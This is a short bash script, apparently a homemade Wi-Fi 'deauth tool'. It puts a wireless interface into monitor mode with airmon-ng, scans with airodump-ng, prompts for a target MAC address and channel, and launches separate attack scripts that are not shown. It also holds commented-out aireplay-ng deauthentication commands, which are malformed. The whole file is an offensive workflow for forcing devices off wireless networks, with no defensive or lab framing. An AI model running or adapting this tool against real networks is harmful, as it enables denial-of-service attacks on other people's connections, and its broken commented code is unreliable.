figlet ANONDEAUTH
echo "ANONYMOUS DEAUTH TOOL" 
echo "Created by Maxim Bethurem"
sudo airmon-ng check kill
read -p 'Interface: ' useriface
echo 'You are using the' $useriface 'interface for the attack.'
sudo airmon-ng start $useriface
read -p 'What is the interface in monitor mode called: ' monface
sudo airodump-ng $monface 
sudo gnome-terminal -e /home/maxim/Desktop/AnonDeauth/monmode.sh
read -p 'what is the MAC address for the target? ' TMAC
read -p 'what is the channel the target is on? ' TCHAN
#ADD CHANGE CHANNEL HERE
read -p 'Would you like to start the attack? y/n: ' attack_yn


#######################################################
#case"$attack_yn" in 
#        [yY] 
#        aireplay-ng $TMAC -0 1000
#        ;;
#        *)
#        echo "Okay, close the window to stop the program"
#esac


#if [["$attack_yn =~ ^([yY][yY])+$ ]]
#then 
#        aireplay-ng $TMAC -0 1000
#else 
#        echo "Okay, close the window to stop the program"
#fi
#############################################################


echo 'starting attack now'

sudo gnome-terminal -e '/home/maxim/Desktop/AnonDeauth/attack.sh' 
sudo gnome-terminal -e '/home/maxim/Desktop/AnonDeauth/anon.sh'  
